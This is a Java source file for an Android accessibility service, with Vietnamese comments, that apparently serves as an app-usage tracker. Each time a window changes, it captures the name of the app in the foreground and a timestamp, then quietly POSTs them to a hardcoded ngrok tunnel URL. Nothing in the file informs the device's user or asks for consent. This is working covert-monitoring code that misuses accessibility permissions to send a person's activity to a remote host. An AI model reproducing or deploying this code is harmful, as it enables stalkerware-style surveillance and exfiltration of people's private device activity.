package com.example.myapplication;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;


public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "MyAccessibilityService";
//    private class SendToServerTask extends Executor{
//
//    }
private Executor executor = Executors.newSingleThreadExecutor();

    private class SendToServerTask implements Runnable {
        private String data;
        public SendToServerTask(String data) {
            this.data = data;
        }
        @Override
        public void run() {
            try {
                String webhookUrl = "https://13a9-118-68-122-101.ngrok-free.app"; // thay đổi đường dẫn ở đây tùy thuộc vào URL của ngrok
                // Tạo đối tượng URL từ đường dẫn URL
                URL url = new URL(webhookUrl);
                // Mở kết nối HTTP
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                // Thiết lập phương thức là POST
                connection.setRequestMethod("POST");
                // Thiết lập header
                connection.setRequestProperty("Content-Type", "application/text");
                // Cho phép viết dữ liệu đến connection
                connection.setDoOutput(true);
                // Gửi dữ liệu thông điệp dạng byte array
                byte[] messageBytes = data.getBytes(StandardCharsets.UTF_8);
                try (OutputStream os = connection.getOutputStream()) {
                    os.write(messageBytes, 0, messageBytes.length);
                }
                // Lấy mã phản hồi từ server
                int responseCode = connection.getResponseCode();
                // Log thông báo khi thực hiện thành công
                Log.d("RESPONSE FROM SERVER","Response Code"+ String.valueOf(responseCode) );
                // Đóng kết nối
                connection.disconnect();
            } catch (Exception e) {
                // Xử lý ngoại lệ nếu có
                Log.e("Deo On R",e.toString());
            }
        }
    }
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d(TAG, "onAccessibilityEvent");
        String packageName = event.getPackageName().toString();
        PackageManager packageManager = this.getPackageManager();
        LocalDateTime currentTime = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            currentTime = LocalDateTime.now();
        }
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
            if (!"Pixel Launcher".equals(applicationLabel.toString())) {
                String msg = currentTime + " APP:" + applicationLabel;
                Log.i(TAG, msg);
                executeSendToServerTask(msg);
            }
        } catch (Exception e) {
            Log.e("Ko dc r",e.toString());
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "INTERUPT");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
//        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
//                AccessibilityEvent.TYPE_VIEW_FOCUSED|AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.eventTypes=AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
        info.notificationTimeout = 100;
        this.setServiceInfo(info);
        Log.d(TAG, "onServiceConnected:");
    }
    private void executeSendToServerTask(String data) {
        executor.execute(new SendToServerTask(data));
    }
}
